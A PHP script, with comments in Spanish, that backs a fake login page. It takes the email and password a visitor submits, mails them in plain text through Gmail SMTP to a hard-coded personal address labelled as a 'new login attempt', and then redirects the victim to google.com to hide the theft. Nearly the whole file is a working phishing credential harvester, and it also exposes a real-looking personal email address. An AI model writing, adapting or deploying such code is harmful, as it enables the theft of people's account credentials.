<?php
// Cargar la librería PHPMailer
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

// Verificar que lleguen los datos por POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibir y limpiar los datos
    $email = trim($_POST["email"] ?? '');
    $password = trim($_POST["password"] ?? '');

    // Validación básica
    if (empty($email) || empty($password)) {
        echo "Faltan datos en el formulario.";
        exit;
    }

    // Crear instancia de PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Configuración del servidor SMTP de Gmail
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';          // Servidor de correo de Google
        $mail->SMTPAuth   = true;                      // Habilitar autenticación
        $mail->Username   = 'sebastiancq2008@gmail.com'; // Tu correo
        $mail->Password   = 'TU_CONTRASEÑA_DE_APLICACION'; // Clave especial (ver abajo)
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; // Seguridad
        $mail->Port       = 587;                      // Puerto de conexión

        // Datos del correo
        $mail->setFrom('sebastiancq2008@gmail.com', 'Sistema de Ingreso');
        $mail->addAddress('sebastiancq2008@gmail.com'); // Destinatario

        $mail->Subject = 'Nuevo intento de inicio de sesión';
        $mail->Body    = "Correo ingresado: $email\nContraseña ingresada: $password";

        // Enviar
        $mail->send();

        // Redirigir después de enviado
        header("Location: https://www.google.com");
        exit;

    } catch (Exception $e) {
        echo "No se pudo enviar el mensaje. Error: {$mail->ErrorInfo}";
    }
} else {
    // Si alguien entra directamente al archivo, regresa al formulario
    header("Location: index.html");
    exit;
}
?>
